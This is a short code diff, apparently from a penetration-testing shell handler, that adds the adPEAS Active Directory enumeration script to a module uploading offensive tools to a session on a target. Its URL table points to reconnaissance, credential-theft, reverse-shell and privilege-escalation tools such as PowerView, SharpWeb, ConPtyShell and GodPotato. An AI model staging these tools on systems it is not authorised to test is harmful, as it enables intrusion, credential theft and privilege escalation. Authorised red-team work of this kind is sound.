@@ -4694,7 +4694,7 @@ class upload_ad_scripts(Module):
 
 	def run(session, args):
 		"""
-		Upload {PowerView, SharpHound, GhostPack}
+		Upload {PowerView, SharpHound, GhostPack, adPEAS}
 		"""
 		if not session.write_access(session.cwd):
 			return
@@ -4708,6 +4708,7 @@ class upload_ad_scripts(Module):
 				"powerview": lambda session: session.upload(URLS['powerview']),
 				"sharphound": __class__.upload_sharphound,
 				"ghostpack":  __class__.upload_ghostpack,
+				"adpeas":     lambda session: session.upload(URLS['adpeas']),
 			}
 
 			if not requested:
@@ -5798,6 +5799,7 @@ URLS = {
 	'powerview':		"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1",
 	'sharpweb':		"https://github.com/djhohnstein/SharpWeb/releases/download/v1.2/SharpWeb.exe",
 	'ghostpack':		"https://codeload.github.com/r3motecontrol/Ghostpack-CompiledBinaries/zip/20a5f0a81456358b2bdc9846774949a7fb25acd8",
+	'adpeas':		"https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1",
 	'conptyshell':		"https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1",
 	'godpotato':		"https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe",
 	'sigmapotato':		"https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe",
